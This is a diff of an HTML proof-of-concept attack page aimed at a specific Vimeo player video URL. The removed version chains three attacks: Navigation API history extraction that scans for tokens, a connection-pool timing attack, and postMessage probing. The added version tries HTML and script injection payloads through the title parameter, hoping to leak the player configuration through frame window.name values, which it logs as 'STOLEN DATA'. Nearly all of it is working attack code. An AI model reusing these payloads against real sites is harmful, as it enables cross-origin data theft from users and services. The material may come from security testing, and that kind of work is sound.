@@ -1,138 +1,78 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Vimeo Complete Attack Chain</title>
-</head>
 <body>
-    <h1>🎯 Complete Vimeo Attack</h1>
-    <button onclick="fullAttack()">Execute Full Attack</button>
-    <pre id="log"></pre>
+    <h1>Dangling Markup + Timing Attack</h1>
+    <div id="log"></div>
 
     <script>
-        const logEl = document.getElementById('log');
         function log(msg) {
-            logEl.textContent += msg + '\n';
+            document.getElementById('log').innerHTML += `<p>${msg}</p>`;
             console.log(msg);
         }
 
-        async function fullAttack() {
-            log('=== PHASE 1: Navigation API Attack ===');
-            await navigationAttack();
+        // Step 1: Try to inject via query parameter
+        const injectionPayloads = [
+            // Try to create an iframe with a name that contains script
+            '"><iframe name="<script>window.name=JSON.stringify(window.playerConfig)<script>">',
             
-            log('\n=== PHASE 2: Timing Attack ===');
-            await timingAttack();
+            // Try to inject into title
+            '"><iframe name="steal">',
             
-            log('\n=== PHASE 3: PostMessage Enumeration ===');
-            await postMessageAttack();
-        }
+            // Try data URI
+            'data:text/html,<iframe name="steal">',
+        ];
 
-        async function navigationAttack() {
-            return new Promise((resolve) => {
-                log('Opening Vimeo in new window...');
-                const win = window.open('https://player.vimeo.com/video/935884964', 'vimeo');
-                
-                setTimeout(() => {
-                    log('Hijacking to about:blank...');
-                    win.location = 'about:blank';
-                    
-                    setTimeout(() => {
-                        try {
-                            if (win.navigation && win.navigation.entries) {
-                                const entries = win.navigation.entries();
-                                log(`✅ Extracted ${entries.length} navigation entries`);
-                                
-                                entries.forEach((entry, i) => {
-                                    log(`  [${i}] ${entry.url}`);
-                                    
-                                    // Check for tokens in URL
-                                    const url = new URL(entry.url);
-                                    if (url.search.includes('token') || url.hash.includes('token')) {
-                                        log(`  🚨 POTENTIAL TOKEN FOUND`);
-                                    }
-                                });
-                                
-                                // Read window.name
-                                if (win.name) {
-                                    log(`Window name: ${win.name}`);
-                                }
-                                
-                            } else {
-                                log('❌ Navigation API not available');
-                            }
-                            
-                            // Close the window
-                            win.close();
-                            
-                        } catch(e) {
-                            log(`❌ Error: ${e.message}`);
-                        }
-                        
-                        resolve();
-                    }, 2000);
-                }, 3000);
-            });
-        }
-
-        async function timingAttack() {
-            // Load iframe that makes authenticated request
+        injectionPayloads.forEach((payload, i) => {
+            const url = `https://player.vimeo.com/video/935884964?title=${encodeURIComponent(payload)}`;
+            log(`Testing payload ${i}: ${payload}`);
+            
             const iframe = document.createElement('iframe');
-            iframe.src = 'https://player.vimeo.com/video/935884964';
+            iframe.src = url;
             iframe.style.display = 'none';
+            iframe.name = `test${i}`;
             document.body.appendChild(iframe);
             
-            await new Promise(r => setTimeout(r, 2000));
-            
-            log('Measuring connection pool...');
-            const timings = [];
-            
-            // Make 12 requests in blocks of 6
-            for (let i = 0; i < 12; i++) {
-                const start = performance.now();
-                await fetch(`https://player.vimeo.com/static/proxy.html?_=${Date.now()}_${i}`, 
-                    { mode: 'no-cors' }
-                ).catch(() => {});
-                const duration = performance.now() - start;
-                timings.push(duration);
+            setTimeout(() => {
+                const win = iframe.contentWindow;
                 
-                if ((i + 1) % 6 === 0) {
-                    await new Promise(r => setTimeout(r, 100));
+                // Try to access nested frames
+                try {
+                    if (win.length > 0) {
+                        log(`✅ Payload ${i} created ${win.length} nested frames`);
+                        
+                        for (let j = 0; j < win.length; j++) {
+                            try {
+                                // Try dangling attack
+                                win[j].location = 'about:blank';
+                                
+                                setTimeout(() => {
+                                    try {
+                                        const name = win[j].name;
+                                        log(`Frame ${j} name: ${name}`);
+                                        
+                                        // Try to parse as JSON
+                                        if (name) {
+                                            try {
+                                                const data = JSON.parse(name);
+                                                log(`🚨 STOLEN DATA: ${JSON.stringify(data)}`);
+                                            } catch {}
+                                        }
+                                    } catch(e) {
+                                        log(`Cannot read frame ${j}: ${e.message}`);
+                                    }
+                                }, 1000);
+                                
+                            } catch(e) {
+                                log(`Cannot modify frame ${j}: ${e.message}`);
+                            }
+                        }
+                    }
+                } catch(e) {
+                    log(`Payload ${i} error: ${e.message}`);
                 }
-            }
-            
-            const avg = timings.reduce((a,b) => a+b) / timings.length;
-            log(`Average timing: ${avg.toFixed(2)}ms`);
-            
-            const slow = timings.filter(t => t > avg * 1.33);
-            if (slow.length > 0) {
-                log(`🚨 ${slow.length} slow requests detected (background XHR active)`);
-            }
-            
-            iframe.remove();
-        }
-
-        async function postMessageAttack() {
-            const iframe = document.createElement('iframe');
-            iframe.src = 'https://player.vimeo.com/video/935884964';
-            document.body.appendChild(iframe);
-            
-            await new Promise(r => setTimeout(r, 3000));
-            
-            log('Testing postMessage methods...');
-            
-            window.addEventListener('message', (e) => {
-                if (e.origin === 'https://player.vimeo.com') {
-                    log(`Response: ${JSON.stringify(e.data)}`);
-                }
-            });
-            
-            const methods = ['getVideoUrl', 'getVideoEmbedCode', 'getCurrentTime'];
-            methods.forEach(method => {
-                iframe.contentWindow.postMessage({ method }, '*');
-            });
-            
-            await new Promise(r => setTimeout(r, 2000));
-            iframe.remove();
-        }
+            }, 3000);
+        });
     </script>
 </body>
 </html>
+                            
